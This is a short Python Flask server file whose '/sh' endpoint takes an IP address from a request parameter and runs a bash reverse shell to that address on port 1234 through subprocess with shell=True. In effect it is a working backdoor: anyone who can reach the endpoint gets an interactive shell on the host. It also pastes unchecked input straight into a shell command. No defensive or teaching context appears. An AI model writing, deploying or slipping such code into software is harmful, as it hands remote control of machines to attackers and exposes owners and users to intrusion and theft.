import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def root_endpoint():
    return 'Server is up'

@app.route('/sh', methods=['GET'])
def execute_command():
    ip = request.args.get('ip', '')
    if not ip:
        return 'No IP provided'

    command = f"/bin/bash -i >& /dev/tcp/{ip}/1234 0>&1"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    return result.stdout

if __name__ == '__main__':
    app.run()
